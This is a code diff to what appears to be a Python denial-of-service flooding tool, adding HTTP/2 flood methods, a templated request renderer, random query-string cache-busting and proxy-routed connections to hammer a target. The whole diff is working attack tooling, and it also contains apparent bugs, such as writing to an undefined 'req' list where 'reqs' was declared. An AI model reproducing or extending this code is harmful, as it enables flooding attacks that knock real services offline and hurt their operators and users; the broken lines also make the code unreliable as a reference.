@@ -22,7 +22,10 @@ from yarl import URL
 
 from . import proxy_proto
 from .core import Methods
-from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO, H2FloodIO
+from .proto import (
+    DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO,
+    H2FloodIO, H2Request,
+)
 from .proxies import ProxySet
 from .targets import Target
 from .utils import GOSSolver, Templater, Tools
@@ -169,7 +172,14 @@ class AsyncTcpFlood(FloodBase):
         }
         return headers
 
-    def build_request(self, *, req_type=None, path_qs=None, headers: Optional[Mapping] = None, body=None) -> bytes:
+    def build_request(
+        self,
+        *,
+        req_type=None,
+        path_qs=None,
+        headers: Optional[Mapping] = None,
+        body=None
+    ) -> bytes:
         req_type = req_type or self._req_type
         path_qs = path_qs or self._url.raw_path_qs
         headers = headers or self.default_headers()
@@ -187,6 +197,29 @@ class AsyncTcpFlood(FloodBase):
         if body:
             request += body
         return request.encode()
+
+    def build_h2_request(
+        self,
+        *,
+        req_type: Optional[str] = None,
+        path_qs: Optional[str] = None,
+        headers: Optional[Mapping] = None,
+        body: Optional[bytes] = None
+    ) -> H2Request:
+        req_type = req_type or self._req_type
+        path_qs = path_qs or self._url.raw_path_qs
+        http_headers = headers or self.default_headers()
+        h2_headers = [
+            (":method", req_type.upper()),
+            (":path", path_qs),
+            (":authority", self._url.raw_authority),
+            (":scheme", "https"),
+        ]
+        del http_headers["Host"]
+        if "Content-Length" in http_headers:
+            del http_headers["Content-Length"]
+        h2_headers.extend(http_headers.items())
+        return (h2_headers, body)
 
     async def run(self, on_connect=None) -> bool:
         try:
@@ -249,52 +282,59 @@ class AsyncTcpFlood(FloodBase):
 
         return await self._exec_proto(conn, on_connect, on_close)
 
+    def requests_renderer(self):
+        get_opt = self._target.option
+
+        req_type = get_opt('verb')
+        raw_path_qs = get_opt('path_qs')
+        raw_body = get_opt('body')
+        raw_headers = get_opt('headers')
+        include_default_headers = get_opt('include_default_headers', True)
+
+        headers = CaseInsensitiveDict(self.default_headers() if include_default_headers else {})
+        render_headers = False
+        if raw_headers:
+            if isinstance(raw_headers, str):
+                render_headers = True
+            else:
+                headers.update(raw_headers)
+
+        cache = self._target.cache
+
+        while True:
+            path_qs = None
+            if raw_path_qs:
+                path_qs = Templater.render(raw_path_qs, cache)
+
+            if render_headers:
+                parsed = json.loads(Templater.render(raw_headers, cache))
+                headers.update(parsed)
+
+            body = None
+            if raw_body:
+                body = Templater.render(raw_body, cache)
+                headers['Content-Length'] = str(len(body))
+
+            yield (req_type, path_qs, headers, body)
+
+
     async def HTTP_TEMPLATE(self, on_connect=None) -> bool:
-        def payload_factory():
-            get_opt = self._target.option
-
-            req_type = get_opt('verb')
-            raw_path_qs = get_opt('path_qs')
-            raw_body = get_opt('body')
-            raw_headers = get_opt('headers')
-            include_default_headers = get_opt('include_default_headers', True)
-
-            headers = CaseInsensitiveDict(self.default_headers() if include_default_headers else {})
-            render_headers = False
-            if raw_headers:
-                if isinstance(raw_headers, str):
-                    render_headers = True
-                else:
-                    headers.update(raw_headers)
-
-            cache = self._target.cache
-
-            def payload():
-                path_qs = None
-                if raw_path_qs:
-                    path_qs = Templater.render(raw_path_qs, cache)
-
-                if render_headers:
-                    parsed = json.loads(Templater.render(raw_headers, cache))
-                    headers.update(parsed)
-
-                body = None
-                if raw_body:
-                    body = Templater.render(raw_body, cache)
-                    headers['Content-Length'] = str(len(body))
-
-                return self.build_request(
+        def payload():
+            renderer = self.requests_renderer()
+            reqs = [None]*self._settings.requests_per_buffer
+            for ind in range(self._settings.requests_per_buffer):
+                (req_type, path_qs, headers, body) = next(renderer)
+                req[ind] = self.build_request(
                     req_type=req_type,
                     path_qs=path_qs,
                     headers=headers,
                     body=body
                 )
-
-            return b''.join(payload() for _ in range(self._settings.requests_per_buffer))
+            return b''.join(reqs)
 
         return await self._generic_flood_proto(
             FloodSpecType.CALLABLE,
-            payload_factory,
+            payload,
             on_connect,
             self._settings.requests_per_connection // self._settings.requests_per_buffer,
         )
@@ -319,58 +359,31 @@ class AsyncTcpFlood(FloodBase):
     HEAD = GET
     RHEAD = RGET
 
+    async def H2_TEMPLATE(self, on_connect=None) -> bool:
+        renderer = self.requests_renderer()
+        reqs = [None]*self._settings.requests_per_buffer
+        for ind in range(self._settings.requests_per_buffer):
+            (req_type, path_qs, headers, body) = next(renderer)
+            req[ind] = self.build_h2_request(
+                req_type=req_type,
+                path_qs=path_qs,
+                headers=headers,
+                body=body
+            )
+        return await self._exec_h2_proto(reqs, on_connect=on_connect)
+
     async def H2_GET(self, on_connect=None) -> bool:
-        # prepare request
-        h2_headers = [
-            (":method", "GET"),
-            (":path", self._url.raw_path_qs),
-            (":authority", self._url.raw_authority),
-            (":scheme", "https"),
-        ]
-        http_headers = self.default_headers()
-        del http_headers['Host']
-        h2_headers.extend(http_headers.items())
-        req = (h2_headers, None)
-
-        # setup flood IO protocol for H2 streams
-        on_close = self._loop.create_future()
-        flood_proto = partial(
-            H2FloodIO,
-            self._loop,
-            [req], # XXX: ready to do some randomization here
-            on_connect=on_connect,
-            on_close=on_close,
-            connections=self._connections,
-            recv=False,
-        )
-
-        # proxy machinary (when necessary)
-        proxy_url: Optional[str] = self._proxies.pick_random()
-        server_hostname = ""
-        if proxy_url is None:
-            conn = self._loop.create_connection(
-                flood_proto,
-                host=self._addr,
-                port=self._target.url.port,
-                ssl=h2_ctx,
-                server_hostname=server_hostname
+        req = self.build_h2_request()
+        return await self._exec_h2_proto([req], on_connect=on_connect)
+    
+    async def H2_RGET(self, on_connect=None) -> bool:
+        reqs = [None]*self._settings.requests_per_buffer
+        for ind in range(self._settings.requests_per_buffer):
+            append = {Tools.rand_str(6): Tools.rand_str(6)}
+            reqs[ind] = self.build_h2_request(
+                path_qs=self._url.update_query(**append).raw_path_qs
             )
-        else:
-            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
-            flood_proto = partial(
-                proxy_protocol,
-                self._proxies,
-                self._loop,
-                on_close,
-                self._raw_address,
-                h2_ctx,
-                downstream_factory=flood_proto,
-                connect_timeout=self._settings.dest_connect_timeout_seconds,
-                on_connect=on_connect,
-            )
-            conn = self._loop.create_connection(
-                flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
-        return await self._exec_proto(conn, on_connect, on_close)
+        return await self._exec_h2_proto(reqs, on_connect=on_connect)
 
     async def POST(self, on_connect=None) -> bool:
         def payload() -> bytes:
@@ -706,6 +719,47 @@ class AsyncTcpFlood(FloodBase):
             conn = self._loop.create_connection(
                 trex_proto, host=proxy.proxy_host, port=proxy.proxy_port, ssl=None)
 
+        return await self._exec_proto(conn, on_connect, on_close)
+
+    async def _exec_h2_proto(self, reqs, on_connect=None) -> bool:
+        # setup flood IO protocol for H2 streams
+        on_close = self._loop.create_future()
+        flood_proto = partial(
+            H2FloodIO,
+            self._loop,
+            reqs,
+            on_connect=on_connect,
+            on_close=on_close,
+            connections=self._connections,
+            recv=False,
+        )
+
+        # proxy machinary (when necessary)
+        proxy_url: Optional[str] = self._proxies.pick_random()
+        server_hostname = ""
+        if proxy_url is None:
+            conn = self._loop.create_connection(
+                flood_proto,
+                host=self._addr,
+                port=self._target.url.port,
+                ssl=h2_ctx,
+                server_hostname=server_hostname
+            )
+        else:
+            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
+            flood_proto = partial(
+                proxy_protocol,
+                self._proxies,
+                self._loop,
+                on_close,
+                self._raw_address,
+                h2_ctx,
+                downstream_factory=flood_proto,
+                connect_timeout=self._settings.dest_connect_timeout_seconds,
+                on_connect=on_connect,
+            )
+            conn = self._loop.create_connection(
+                flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def _exec_proto(self, conn, on_connect, on_close) -> bool:
